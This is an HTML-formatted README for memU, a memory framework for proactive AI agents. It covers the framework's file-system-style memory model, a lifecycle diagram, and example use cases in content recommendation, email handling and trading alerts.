&lt;p&gt;memU is a memory framework built for &lt;strong&gt;24/7 proactive agents&lt;/strong&gt;. It is designed for long-running use and greatly &lt;strong&gt;reduces the LLM token cost&lt;/strong&gt; of keeping agents always online, making always-on, evolving agents practical in production systems. memU &lt;strong&gt;continuously captures and understands user intent&lt;/strong&gt;. Even without a command, the agent can tell what you are about to do and act on it by itself.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;ü§ñ &lt;a href="https://memu.bot"&gt;OpenClaw (Moltbot, Clawdbot) Alternative&lt;/a&gt;&lt;/h2&gt; 
&lt;img width="100%" src="https://github.com/NevaMind-AI/memU/raw/main/assets/memUbot.png" /&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Download-and-use and simple&lt;/strong&gt; to get started.&lt;/li&gt; 
 &lt;li&gt;Builds long-term memory to &lt;strong&gt;understand user intent&lt;/strong&gt; and act proactively.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Cuts LLM token cost&lt;/strong&gt; with smaller context.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Try now: &lt;a href="https://memu.bot"&gt;memU bot&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üóÉÔ∏è Memory as File System, File System as Memory&lt;/h2&gt; 
&lt;p&gt;memU treats &lt;strong&gt;memory like a file system&lt;/strong&gt;‚Äîstructured, hierarchical, and instantly accessible.&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;File System&lt;/th&gt; 
   &lt;th&gt;memU Memory&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üìÅ Folders&lt;/td&gt; 
   &lt;td&gt;üè∑Ô∏è Categories (auto-organized topics)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üìÑ Files&lt;/td&gt; 
   &lt;td&gt;üß† Memory Items (extracted facts, preferences, skills)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üîó Symlinks&lt;/td&gt; 
   &lt;td&gt;üîÑ Cross-references (related memories linked)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üìÇ Mount points&lt;/td&gt; 
   &lt;td&gt;üì• Resources (conversations, documents, images)&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;Why this matters:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Navigate memories&lt;/strong&gt; like browsing directories‚Äîdrill down from broad categories to specific facts&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Mount new knowledge&lt;/strong&gt; instantly‚Äîconversations and documents become queryable memory&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Cross-link everything&lt;/strong&gt;‚Äîmemories reference each other, building a connected knowledge graph&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Persistent &amp;amp; portable&lt;/strong&gt;‚Äîexport, backup, and transfer memory like files&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code&gt;memory/
‚îú‚îÄ‚îÄ preferences/
‚îÇ   ‚îú‚îÄ‚îÄ communication_style.md
‚îÇ   ‚îî‚îÄ‚îÄ topic_interests.md
‚îú‚îÄ‚îÄ relationships/
‚îÇ   ‚îú‚îÄ‚îÄ contacts/
‚îÇ   ‚îî‚îÄ‚îÄ interaction_history/
‚îú‚îÄ‚îÄ knowledge/
‚îÇ   ‚îú‚îÄ‚îÄ domain_expertise/
‚îÇ   ‚îî‚îÄ‚îÄ learned_skills/
‚îî‚îÄ‚îÄ context/
    ‚îú‚îÄ‚îÄ recent_conversations/
    ‚îî‚îÄ‚îÄ pending_tasks/
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Just as a file system turns raw bytes into organized data, memU transforms raw interactions into &lt;strong&gt;structured, searchable, proactive intelligence&lt;/strong&gt;.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;‚≠êÔ∏è Star the repository&lt;/h2&gt; 
&lt;img width="100%" src="https://github.com/NevaMind-AI/memU/raw/main/assets/star.gif" /&gt; If you find memU useful or interesting, a GitHub Star ‚≠êÔ∏è would be greatly appreciated. 
&lt;hr /&gt; 
&lt;h2&gt;‚ú® Core Features&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Capability&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ü§ñ &lt;strong&gt;24/7 Proactive Agent&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Always-on memory agent that works continuously in the background‚Äînever sleeps, never forgets&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üéØ &lt;strong&gt;User Intention Capture&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Understands and remembers user goals, preferences, and context across sessions automatically&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üí∞ &lt;strong&gt;Cost Efficient&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Reduces long-running token costs by caching insights and avoiding redundant LLM calls&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üîÑ How Proactive Memory Works&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;
cd examples/proactive
python proactive.py

&lt;/code&gt;&lt;/pre&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Proactive Memory Lifecycle&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                                         USER QUERY                                               ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                 ‚îÇ                                                           ‚îÇ
                 ‚ñº                                                           ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ         ü§ñ MAIN AGENT                  ‚îÇ         ‚îÇ              üß† MEMU BOT                       ‚îÇ
‚îÇ                                        ‚îÇ         ‚îÇ                                                ‚îÇ
‚îÇ  Handle user queries &amp;amp; execute tasks   ‚îÇ  ‚óÑ‚îÄ‚îÄ‚îÄ‚ñ∫  ‚îÇ  Monitor, memorize &amp;amp; proactive intelligence   ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§         ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                        ‚îÇ         ‚îÇ                                                ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ         ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ  1. RECEIVE USER INPUT           ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ  1. MONITOR INPUT/OUTPUT                 ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Parse query, understand      ‚îÇ  ‚îÇ   ‚îÄ‚îÄ‚îÄ‚ñ∫  ‚îÇ  ‚îÇ     Observe agent interactions           ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     context and intent           ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ     Track conversation flow              ‚îÇ  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ         ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îÇ                 ‚îÇ                      ‚îÇ         ‚îÇ                    ‚îÇ                           ‚îÇ
‚îÇ                 ‚ñº                      ‚îÇ         ‚îÇ                    ‚ñº                           ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ         ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ  2. PLAN &amp;amp; EXECUTE               ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ  2. MEMORIZE &amp;amp; EXTRACT                   ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Break down tasks             ‚îÇ  ‚îÇ   ‚óÑ‚îÄ‚îÄ‚îÄ  ‚îÇ  ‚îÇ     Store insights, facts, preferences   ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Call tools, retrieve data    ‚îÇ  ‚îÇ  inject ‚îÇ  ‚îÇ     Extract skills &amp;amp; knowledge           ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Generate responses           ‚îÇ  ‚îÇ  memory ‚îÇ  ‚îÇ     Update user profile                  ‚îÇ  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ         ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îÇ                 ‚îÇ                      ‚îÇ         ‚îÇ                    ‚îÇ                           ‚îÇ
‚îÇ                 ‚ñº                      ‚îÇ         ‚îÇ                    ‚ñº                           ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ         ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ  3. RESPOND TO USER              ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ  3. PREDICT USER INTENT                  ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Deliver answer/result        ‚îÇ  ‚îÇ   ‚îÄ‚îÄ‚îÄ‚ñ∫  ‚îÇ  ‚îÇ     Anticipate next steps                ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Continue conversation        ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ     Identify upcoming needs              ‚îÇ  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ         ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îÇ                 ‚îÇ                      ‚îÇ         ‚îÇ                    ‚îÇ                           ‚îÇ
‚îÇ                 ‚ñº                      ‚îÇ         ‚îÇ                    ‚ñº                           ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ         ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ  4. LOOP                         ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ  4. RUN PROACTIVE TASKS                  ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Wait for next user input     ‚îÇ  ‚îÇ   ‚óÑ‚îÄ‚îÄ‚îÄ  ‚îÇ  ‚îÇ     Pre-fetch relevant context           ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     or proactive suggestions     ‚îÇ  ‚îÇ  suggest‚îÇ  ‚îÇ     Prepare recommendations              ‚îÇ  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ         ‚îÇ  ‚îÇ     Update todolist autonomously         ‚îÇ  ‚îÇ
‚îÇ                                        ‚îÇ         ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò         ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                 ‚îÇ                                                           ‚îÇ
                 ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                                             ‚ñº
                              ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
                              ‚îÇ     CONTINUOUS SYNC LOOP     ‚îÇ
                              ‚îÇ  Agent ‚óÑ‚îÄ‚îÄ‚ñ∫ MemU Bot ‚óÑ‚îÄ‚îÄ‚ñ∫ DB ‚îÇ
                              ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
&lt;/code&gt;&lt;/pre&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üéØ Proactive Use Cases&lt;/h2&gt; 
&lt;h3&gt;1. &lt;strong&gt;Information Recommendation&lt;/strong&gt;&lt;/h3&gt; 
&lt;p&gt;&lt;em&gt;Agent monitors interests and proactively surfaces relevant content&lt;/em&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# User has been researching AI topics
MemU tracks: reading history, saved articles, search queries

# When new content arrives:
Agent: "I found 3 new papers on RAG optimization that align with
        your recent research on retrieval systems. One author
        (Dr. Chen) you've cited before published yesterday."

# Proactive behaviors:
- Learns topic preferences from browsing patterns
- Tracks author/source credibility preferences
- Filters noise based on engagement history
- Times recommendations for optimal attention
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;2. &lt;strong&gt;Email Management&lt;/strong&gt;&lt;/h3&gt; 
&lt;p&gt;&lt;em&gt;Agent learns communication patterns and handles routine correspondence&lt;/em&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# MemU observes email patterns over time:
- Response templates for common scenarios
- Priority contacts and urgent keywords
- Scheduling preferences and availability
- Writing style and tone variations

# Proactive email assistance:
Agent: "You have 12 new emails. I've drafted responses for 3 routine
        requests and flagged 2 urgent items from your priority contacts.
        Should I also reschedule tomorrow's meeting based on the
        conflict John mentioned?"

# Autonomous actions:
‚úì Draft context-aware replies
‚úì Categorize and prioritize inbox
‚úì Detect scheduling conflicts
‚úì Summarize long threads with key decisions
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;3. &lt;strong&gt;Trading &amp;amp; Financial Monitoring&lt;/strong&gt;&lt;/h3&gt; 
&lt;p&gt;&lt;em&gt;Agent tracks market context and user investment behavior&lt;/em&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# MemU learns trading preferences:
- Risk tolerance from historical decisions
- Preferred sectors and asset classes
- Response patterns to market events
- Portfolio rebalancing triggers

# Proactive alerts:
Agent: "NVDA dropped 5% in after-hours trading. Based on your past
        behavior, you typically buy tech dips above 3%. Your current
        allocation allows for $2,000 additional exposure while
        maintaining your 70/30 equity-bond target."

# Continuous monitoring:
- Track price alerts tied to user-defined thresholds
- Correlate news events with portfolio impact
- Learn from executed vs. ignored recommendations
- Anticipate tax-loss harvesting opportunities
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;...&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üóÇÔ∏è Hierarchical Memory Architecture&lt;/h2&gt; 
&lt;p&gt;MemU's three-layer system enables both &lt;strong&gt;reactive queries&lt;/strong&gt; and &lt;strong&gt;proactive context loading&lt;/strong&gt;:&lt;/p&gt; 
&lt;img width="100%" alt="structure" src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/structure.png" /&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Layer&lt;/th&gt; 
   &lt;th&gt;Reactive Use&lt;/th&gt; 
   &lt;th&gt;Proactive Use&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Resource&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Direct access to original data&lt;/td&gt; 
   &lt;td&gt;Background monitoring for new patterns&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Item&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Targeted fact retrieval&lt;/td&gt; 
   &lt;td&gt;Real-time extraction from ongoing interactions&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Summary-level overview&lt;/td&gt; 
   &lt;td&gt;Automatic context assembly for anticipation&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Benefits:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Auto-categorization&lt;/strong&gt;: New memories self-organize into topics&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Pattern Detection&lt;/strong&gt;: System identifies recurring themes&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Context Prediction&lt;/strong&gt;: Anticipates what information will be needed next&lt;/li&gt; 
